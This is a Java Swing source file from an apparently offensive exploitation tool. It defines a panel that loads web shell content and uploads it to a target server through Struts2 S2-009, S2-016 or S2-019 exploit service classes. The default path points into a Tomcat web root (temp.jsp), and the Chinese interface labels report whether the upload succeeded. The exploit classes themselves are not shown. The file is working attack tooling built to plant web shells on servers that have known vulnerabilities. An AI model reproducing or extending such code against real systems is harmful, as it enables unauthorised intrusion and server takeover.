package org.vit.ui;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JPanel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JButton;
import javax.swing.JTextPane;

import org.vit.model.MyURL;
import org.vit.service.ExploitService;
import org.vit.service.impl.Struts2_S016_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S019_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S09_ExploitServiceImpl;

import org.vit.util.ReadFileContent;

import java.awt.FlowLayout;

public class CustomUploadPanel extends JPanel implements ActionListener{
	private static final long serialVersionUID = 1L;
	private JTextField fileNameJTextField;
	private JButton uploadJButton;
	private JTextPane shellContentJTextPane;
	private JPanel msgJPanel;
	private JLabel resultJLabel;
	
	private MyURL myURL;
	private String version;
	
	public MyURL getMyURL() {
		return myURL;
	}

	public void setMyURL(MyURL myURL) {
		this.myURL = myURL;
	}

	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;
	}
	
	public CustomUploadPanel(){
		setSize(600, 400);
		
		JLabel filePathJLabel = new JLabel("\u6587\u4ef6\u5b8c\u6574\u8def\u5f84");
		
		fileNameJTextField = new JTextField("/opt/tomcat/webapps/ROOT/temp.jsp");
		fileNameJTextField.setColumns(10);
		
		uploadJButton = new JButton("\u4e0a\u4f20");
		uploadJButton.addActionListener(this);
		
		shellContentJTextPane = new JTextPane();
		try {
			shellContentJTextPane.setText(ReadFileContent.getFileContent());
		} catch (Exception e) {
			
		}
		shellContentJTextPane.setCaretPosition(0);
		JScrollPane shellJScrollPane=new JScrollPane(shellContentJTextPane);
		
		msgJPanel = new JPanel();
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(shellJScrollPane, GroupLayout.DEFAULT_SIZE, 580, Short.MAX_VALUE)
							.addContainerGap())
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(filePathJLabel)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(fileNameJTextField, GroupLayout.DEFAULT_SIZE, 393, Short.MAX_VALUE)
							.addGap(18)
							.addComponent(uploadJButton)
							.addGap(64))))
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(msgJPanel, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
					.addContainerGap())
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(filePathJLabel)
						.addComponent(fileNameJTextField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(uploadJButton))
					.addGap(18)
					.addComponent(shellJScrollPane, GroupLayout.DEFAULT_SIZE, 320, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(msgJPanel, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE))
		);
		msgJPanel.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));
		
		resultJLabel = new JLabel();
		msgJPanel.add(resultJLabel);
		
		setLayout(groupLayout);
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		if (e.getSource()==uploadJButton) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					resultJLabel.setText("\u8bf7\u7a0d\u5019...");
					String filePath=fileNameJTextField.getText().trim();
					String fileContent=shellContentJTextPane.getText();
					doFileUpload(filePath,fileContent);
				}
			}).start();
		}
	}
	
	public void doFileUpload(String filePath,String fileContent){
		
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			String msg= service.doCustomUplaod(myURL, filePath, fileContent);
			if (msg.equals("ok")) {
				resultJLabel.setText("\u606d\u559c\u4f60\uff0c\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\u0021");
			}else {
				resultJLabel.setText("\u5bf9\u4e0d\u8d77\uff0c\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\u0021");
			}
		} catch (Exception e) {
			e.printStackTrace();
			resultJLabel.setText("\u5bf9\u4e0d\u8d77\uff0c\u6587\u4ef6\u4e0a\u4f20\u6709\u5f02\u5e38\u0021");
		}
	}
	
}
